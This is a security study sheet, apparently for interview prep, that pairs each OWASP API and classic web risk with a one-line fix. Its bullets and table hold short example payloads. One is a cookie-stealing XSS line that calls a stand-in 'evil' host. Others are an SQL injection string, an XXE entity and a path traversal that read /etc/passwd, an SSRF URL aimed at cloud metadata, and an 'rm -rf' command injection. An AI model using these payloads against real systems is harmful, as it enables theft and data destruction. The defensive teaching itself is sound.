# 06 — OWASP Canon: Thieves' Gallery (Top 10 + API 10, one-line fixes)

Memorize thief → lock. Interviews ask "top 3 API risks?" → **BOLA/IDOR, authN/Z, injection** — always.

## 1. OWASP API Top 10 (2023) — the exam sheet

| # | Thief | Lock |
|---|---|---|
| 1 BOLA/IDOR | Fetch ANY user's order by id | object-level check (owner-or-role) EVERY read/write |
| 2 Broken AuthN | Long-lived tokens, no rotation | short JWT + rotating refresh + MFA + rate-limit login |
| 3 BFLA | `POST /admin/refund` as viewer | role check per ACTION, not just route prefix |
| 4 Unrestricted consumption | `?limit=1M`, 2 GB upload, deep GraphQL | caps + quotas + depth/cost limits + 429 |
| 5 BFLA-function-level (mass assign) | `{"role":"admin"}` in signup body | allowlist fields (Pydantic `extra="forbid"` / response+request models) |
| 6 Unrestricted business flow | 10k coupon redemptions/sec | state machines + idempotency + abuse counters |
| 7 SSRF | `?url=http://169.254.169.254/` reads cloud keys! | allowlist hosts, block metadata IP, no redirects to private ranges |
| 8 Misconfig | Debug on, `*` CORS, stack traces | hardened templates + headers + `OPTIONS` audit |
| 9 Inventory | Forgotten `/v1` + staging with prod data | registry of ALL versions/envs; kill zombies |
| 10 Unsafe consumption | Trusting provider webhook JSON blindly | validate + size-cap + schema-check third-party data |

## 2. Classic Top 10, thief-by-thief (all demoed in `../examples/06_injection_defenses.py`)

- **SQLi**: `' OR '1'='1` in login → full dump. Lock: **parameterized queries ONLY** (`WHERE email = ?`, never f-strings) + least-privilege DB user.
- **XSS**: `<script>fetch(evil?c=+document.cookie)</script>` in a comment → cookie theft. Lock: **escape on render** (`html.escape`), HttpOnly cookies, CSP (below).
- **CSRF**: evil site auto-submits `POST bank/transfer` with YOUR cookies. Lock: **SameSite=Lax + anti-CSRF token** for cookie auth (Bearer-header APIs are immune — no auto-send!).
- **SSRF**: (above) — the cloud-killer. Lock: resolve+allowlist, metadata-IP block, no-follow-private.
- **XXE**: XML `<!ENTITY xxe SYSTEM "file:///etc/passwd">` exfiltrates. Lock: **disable DTD/entities** (`defusedxml`), prefer JSON.
- **Path traversal**: `GET /files/../../etc/passwd`. Lock: `resolve()` + `is_relative_to(base)` + random stored names.
- **Clickjacking**: invisible iframe over "Pay" button. Lock: `X-Frame-Options: DENY` / `frame-ancestors 'none'`.
- **Command injection**: `; rm -rf` in a filename passed to shell. Lock: **argv lists, never `shell=True`**; `shlex.quote` if unavoidable.

One-liner: **"BOLA first, then auth, then injection — parameterize, escape, allowlist, and check the OBJECT not the route."**
